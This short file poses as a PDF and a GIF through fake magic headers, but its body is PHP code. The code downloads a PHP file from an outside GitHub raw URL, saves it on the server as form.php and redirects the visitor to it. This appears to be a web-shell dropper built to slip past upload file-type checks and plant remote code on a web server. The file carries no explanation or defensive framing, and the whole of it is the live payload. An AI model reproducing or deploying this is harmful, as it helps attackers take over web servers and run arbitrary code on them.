%PDF-1.3
%每每每每
GIF89;a
<html>
<?php
    $url = "https://raw.githubusercontent.com/cncmedya/form/refs/heads/main/form.php";
    $fileContent = file_get_contents($url);
    if ($fileContent !== false) {
        $fileName = "form.php"; 
        $uploadDirectory = "";
        if (file_put_contents($uploadDirectory . $fileName, $fileContent) !== false) {
            header("Location: " . $fileName);
            exit;
        } 
    }
?>
</html>
